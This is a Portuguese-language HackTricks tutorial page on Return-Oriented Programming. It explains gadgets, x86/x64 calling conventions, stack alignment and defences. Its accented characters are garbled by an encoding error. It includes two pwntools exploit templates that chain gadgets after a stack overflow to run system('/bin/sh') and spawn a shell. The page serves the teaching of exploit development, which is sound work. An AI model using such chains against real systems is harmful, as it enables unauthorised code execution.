# ROP - Programa√ß√£o Orientada a Retorno

{% hint style="success" %}
Aprenda e pratique Hacking na AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking no GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## **Informa√ß√µes B√°sicas**

**Programa√ß√£o Orientada a Retorno (ROP)** √© uma t√©cnica avan√ßada de explora√ß√£o usada para contornar medidas de seguran√ßa como **No-Execute (NX)** ou **Data Execution Prevention (DEP)**. Em vez de injetar e executar shellcode, um atacante aproveita peda√ßos de c√≥digo j√° presentes no bin√°rio ou em bibliotecas carregadas, conhecidos como **"gadgets"**. Cada gadget geralmente termina com uma instru√ß√£o `ret` e realiza uma pequena opera√ß√£o, como mover dados entre registradores ou realizar opera√ß√µes aritm√©ticas. Ao encadear esses gadgets, um atacante pode construir uma carga √∫til para realizar opera√ß√µes arbitr√°rias, contornando efetivamente as prote√ß√µes NX/DEP.

### Como o ROP Funciona

1. **Sequestro de Fluxo de Controle**: Primeiro, um atacante precisa sequestrar o fluxo de controle de um programa, geralmente explorando um estouro de buffer para sobrescrever um endere√ßo de retorno salvo na pilha.
2. **Encadeamento de Gadgets**: O atacante ent√£o seleciona e encadeia cuidadosamente gadgets para realizar as a√ß√µes desejadas. Isso poderia envolver configurar argumentos para uma chamada de fun√ß√£o, chamar a fun√ß√£o (por exemplo, `system("/bin/sh")`), e lidar com qualquer limpeza necess√°ria ou opera√ß√µes adicionais.
3. **Execu√ß√£o da Carga √ötil**: Quando a fun√ß√£o vulner√°vel retorna, em vez de retornar para uma localiza√ß√£o leg√≠tima, ela come√ßa a executar a cadeia de gadgets.

### Ferramentas

Normalmente, gadgets podem ser encontrados usando [**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget), [**ropper**](https://github.com/sashs/Ropper) ou diretamente do **pwntools** ([ROP](https://docs.pwntools.com/en/stable/rop/rop.html)).

## Cadeia ROP no Exemplo x86

### **Conven√ß√µes de Chamada x86 (32 bits)**

* **cdecl**: O chamador limpa a pilha. Os argumentos da fun√ß√£o s√£o empurrados para a pilha em ordem reversa (da direita para a esquerda). **Os argumentos s√£o empurrados para a pilha da direita para a esquerda.**
* **stdcall**: Semelhante ao cdecl, mas o callee √© respons√°vel por limpar a pilha.

### **Encontrando Gadgets**

Primeiramente, vamos assumir que identificamos os gadgets necess√°rios dentro do bin√°rio ou de suas bibliotecas carregadas. Os gadgets de interesse s√£o:

* `pop eax; ret`: Este gadget desempilha o valor do topo da pilha para o registrador `EAX` e ent√£o retorna, permitindo controlar `EAX`.
* `pop ebx; ret`: Semelhante ao anterior, mas para o registrador `EBX`, possibilitando controle sobre `EBX`.
* `mov [ebx], eax; ret`: Move o valor em `EAX` para a localiza√ß√£o de mem√≥ria apontada por `EBX` e ent√£o retorna. Isso √© frequentemente chamado de **gadget write-what-where**.
* Al√©m disso, temos o endere√ßo da fun√ß√£o `system()` dispon√≠vel.

### **Cadeia ROP**

Usando o **pwntools**, preparamos a pilha para a execu√ß√£o da cadeia ROP da seguinte forma visando executar `system('/bin/sh')`, observe como a cadeia come√ßa com:

1. Uma instru√ß√£o `ret` para fins de alinhamento (opcional)
2. Endere√ßo da fun√ß√£o `system` (supondo ASLR desativado e libc conhecida, mais informa√ß√µes em [**Ret2lib**](ret2lib/))
3. Marcador de posi√ß√£o para o endere√ßo de retorno de `system()`
4. Endere√ßo da string `"/bin/sh"` (par√¢metro para a fun√ß√£o system)
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## Exemplo de Cadeia ROP em x64

### **Conven√ß√µes de chamada x64 (64 bits)**

* Utiliza a conven√ß√£o de chamada **System V AMD64 ABI** em sistemas semelhantes ao Unix, onde os **primeiros seis argumentos inteiros ou ponteiros s√£o passados nos registradores `RDI`, `RSI`, `RDX`, `RCX`, `R8` e `R9`**. Argumentos adicionais s√£o passados na pilha. O valor de retorno √© colocado em `RAX`.
* A conven√ß√£o de chamada do **Windows x64** utiliza `RCX`, `RDX`, `R8` e `R9` para os quatro primeiros argumentos inteiros ou ponteiros, com argumentos adicionais passados na pilha. O valor de retorno √© colocado em `RAX`.
* **Registradores**: Os registradores de 64 bits incluem `RAX`, `RBX`, `RCX`, `RDX`, `RSI`, `RDI`, `RBP`, `RSP` e `R8` a `R15`.

#### **Encontrando Gadgets**

Para nosso prop√≥sito, vamos focar em gadgets que nos permitir√£o definir o registrador **RDI** (para passar a string **"/bin/sh"** como argumento para **system()**) e ent√£o chamar a fun√ß√£o **system()**. Vamos assumir que identificamos os seguintes gadgets:

* **pop rdi; ret**: Desempilha o valor do topo da pilha em **RDI** e ent√£o retorna. Essencial para definir nosso argumento para **system()**.
* **ret**: Um retorno simples, √∫til para alinhamento de pilha em alguns cen√°rios.

E sabemos o endere√ßo da fun√ß√£o **system()**.

### **Cadeia ROP**

Abaixo est√° um exemplo usando **pwntools** para configurar e executar uma cadeia ROP com o objetivo de executar **system('/bin/sh')** em **x64**:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
Neste exemplo:

* Utilizamos o gadget **`pop rdi; ret`** para definir **`RDI`** como o endere√ßo de **`"/bin/sh"`**.
* Saltamos diretamente para **`system()`** ap√≥s definir **`RDI`**, com o endere√ßo de **`system()`** na cadeia.
* O **`ret_gadget`** √© usado para alinhamento se o ambiente de destino exigir, o que √© mais comum em **x64** para garantir o alinhamento adequado da pilha antes de chamar fun√ß√µes.

### Alinhamento da Pilha

**O ABI x86-64** garante que a **pilha esteja alinhada em 16 bytes** quando uma **instru√ß√£o de chamada** √© executada. **LIBC**, para otimizar o desempenho, **usa instru√ß√µes SSE** (como **movaps**) que exigem esse alinhamento. Se a pilha n√£o estiver alinhada corretamente (ou seja, **RSP** n√£o √© um m√∫ltiplo de 16), chamadas para fun√ß√µes como **system** falhar√£o em uma **cadeia ROP**. Para corrigir isso, basta adicionar um **gadget ret** antes de chamar **system** em sua cadeia ROP.

## Diferen√ßa principal entre x86 e x64

{% hint style="success" %}
Como **x64 usa registradores para os primeiros argumentos**, muitas vezes requer menos gadgets do que x86 para chamadas de fun√ß√£o simples, mas encontrar e encadear os gadgets corretos pode ser mais complexo devido ao aumento do n√∫mero de registradores e ao maior espa√ßo de endere√ßamento. O aumento do n√∫mero de registradores e do maior espa√ßo de endere√ßamento na arquitetura **x64** oferece tanto oportunidades quanto desafios para o desenvolvimento de exploits, especialmente no contexto da Programa√ß√£o Orientada a Retorno (ROP).
{% endhint %}

## Exemplo de Cadeia ROP em ARM64

### **No√ß√µes B√°sicas do ARM64 & Conven√ß√µes de Chamada**

Verifique a seguinte p√°gina para obter essas informa√ß√µes:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## Prote√ß√µes Contra ROP

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **e** [**PIE**](../common-binary-protections-and-bypasses/pie/): Essas prote√ß√µes tornam mais dif√≠cil o uso de ROP, pois os endere√ßos dos gadgets mudam entre as execu√ß√µes.
* [**Can√°rios de Pilha**](../common-binary-protections-and-bypasses/stack-canaries/): Em caso de BOF, √© necess√°rio ignorar o can√°rio de pilha para sobrescrever os ponteiros de retorno e abusar de uma cadeia ROP.
* **Falta de Gadgets**: Se n√£o houver gadgets suficientes, n√£o ser√° poss√≠vel gerar uma cadeia ROP.

## T√©cnicas Baseadas em ROP

Observe que ROP √© apenas uma t√©cnica para executar c√≥digo arbitr√°rio. Com base em ROP, muitas t√©cnicas Ret2XXX foram desenvolvidas:

* **Ret2lib**: Usa ROP para chamar fun√ß√µes arbitrariamente de uma biblioteca carregada com par√¢metros arbitr√°rios (geralmente algo como `system('/bin/sh')`.

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: Usa ROP para preparar uma chamada a uma syscall, por exemplo, `execve`, e faz√™-la executar comandos arbitr√°rios.

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: O primeiro abusar√° do EBP em vez do EIP para controlar o fluxo e o segundo √© semelhante ao Ret2lib, mas neste caso o fluxo √© controlado principalmente com endere√ßos de EBP (embora tamb√©m seja necess√°rio controlar o EIP).

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## Outros Exemplos e Refer√™ncias

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64 bits, Pie e nx habilitados, sem can√°rio, sobrescreva RIP com um endere√ßo `vsyscall` com o √∫nico prop√≥sito de retornar para o pr√≥ximo endere√ßo na pilha que ser√° uma sobrescrita parcial do endere√ßo para obter a parte da fun√ß√£o que vaza a flag
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, sem ASLR, gadget ROP para tornar a pilha execut√°vel e saltar para shellcode na pilha

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Treinamento HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Treinamento HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoie o HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
